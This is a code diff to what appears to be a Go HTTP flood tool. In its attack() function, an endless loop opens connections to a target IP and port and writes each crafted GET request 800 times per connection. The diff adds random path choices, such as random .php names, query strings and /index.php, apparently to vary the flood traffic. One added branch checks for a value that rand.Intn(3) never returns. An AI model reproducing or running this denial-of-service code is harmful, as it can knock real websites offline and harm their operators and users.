@@ -101,7 +101,16 @@ func attack() {
 	header := getheader()
 	for {
 		if rpath == true {
-			path = "/" + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + ".php"
+			roption := rand.Intn(3)
+			if roption == 1 {
+				path = "/?=" + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + ".php"
+			} else if roption == 2 {
+				path = "/index.php"
+			} else if roption == 3 {
+				path = "/?=" + strconv.Itoa(rand.Intn(99))
+			} else {
+				path = "/"
+			}
 		}
 		get_host := fmt.Sprintf("GET %s HTTP/1.1\r\nHost:%s:%d\r\n", path, ip, port)
 		request := get_host + header
@@ -116,7 +125,7 @@ func attack() {
 			if err != nil {
 				fmt.Println("Connection Down!!!")
 			} else {
-				for i :=0; i < 800; i++{
+				for i := 0; i < 800; i++ {
 					x.Write([]byte(request))
 				}
 				x.Close()
